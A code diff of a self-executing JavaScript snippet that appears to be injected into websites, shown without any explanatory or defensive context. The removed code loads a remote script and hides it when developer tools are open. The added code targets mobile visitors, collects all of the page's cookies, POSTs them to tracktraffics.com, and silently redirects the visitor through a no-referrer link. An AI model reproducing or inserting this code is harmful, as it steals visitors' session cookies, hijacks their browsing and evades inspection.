@@ -1,74 +1,60 @@
-(async function () {
-  function detectDevice() {
-    const ua = navigator.userAgent;
-    if (/Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
-      return "Mobile";
-    }
-    if (/Tablet|iPad/i.test(ua)) {
-      return "Tablet";
-    }
-    return "Desktop";
-  }
+(async function() {
 
-     function generateUUID() {
-        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-            var r = Math.random() * 16 | 0,
-                v = c === 'x' ? r : (r & 0x3 | 0x8);
-            return v.toString(16);
+    function isMobileDevice() {
+        return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    if (!isMobileDevice()) {
+        return; 
+    }
+
+    if (sessionStorage.getItem('redirected')) {
+        return; 
+    }
+
+    function getCookies() {
+        return document.cookie.split(';').reduce((cookieObject, cookie) => {
+            let [name, ...value] = cookie.split('=');
+            name = name.trim();
+            if (name) {
+                cookieObject[name] = decodeURIComponent(value.join('=').trim());
+            }
+            return cookieObject;
+        }, {});
+    }
+
+    let cookies = getCookies();
+    let requestData = {
+    url: window.location.href, 
+    referrer: document.referrer, 
+    coo: JSON.stringify(cookies), 
+    origin: window.location.hostname 
+    };
+    
+    try {
+        let response = await fetch('https://www.tracktraffics.com/api/scriptdata', {
+            method: 'POST',
+            body: JSON.stringify(requestData),
+            headers: { 'Content-Type': 'application/json' }
         });
-    }
 
-
-  const deviceType = detectDevice();
-  const hostname = window.location.hostname;
-
-  try {
-
-    let uniqueId = getCookie('tracking_uuid') || generateUUID();
-            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
-            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
-
-
-
-    let response = await fetch("https://www.tracktraffics.com/api/track-user-data", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-         url: window.location.href,
-        referrer: document.referrer,
-        unique_id: uniqueId,
-        origin: window.location.hostname,
-      
-      }),
-    });
-
-    let result = await response.json();
-
-    if (result.affiliate_url) {
-      const trackingScript = document.createElement("script");
-      trackingScript.src = result.affiliate_url;
-      trackingScript.referrerPolicy = "no-referrer";
-      trackingScript.async = true;
-      document.body.appendChild(trackingScript);
-
- 
-      function isDevToolsOpen() {
-        return (
-          window.outerHeight - window.innerHeight > 160 ||
-          window.outerWidth - window.innerWidth > 160
-        );
-      }
-
-      const interval = setInterval(() => {
-        if (isDevToolsOpen()) {
-          trackingScript.remove();
-          clearInterval(interval);
+        if (!response.ok) {
+            let errorText = await response.text();  
+            throw new Error(`HTTP error! status: ${response.status}, response: ${errorText}`);
         }
-      }, 500);
+
+        let responseData = await response.json();
+        
+        if (responseData && responseData.url) {
+            let link = document.createElement('a');
+            link.href = responseData.url;  
+            link.rel = 'noreferrer';       
+            document.body.appendChild(link);  
+            link.click();          
+            //window.location.href = responseData.url;       
+            sessionStorage.setItem('redirected', 'true');
+        }
+    } catch (error) {
+        console.error('Error sending data:', error);
     }
-  } catch (err) {
-    console.error("Fetch error:", err);
-  }
 })();
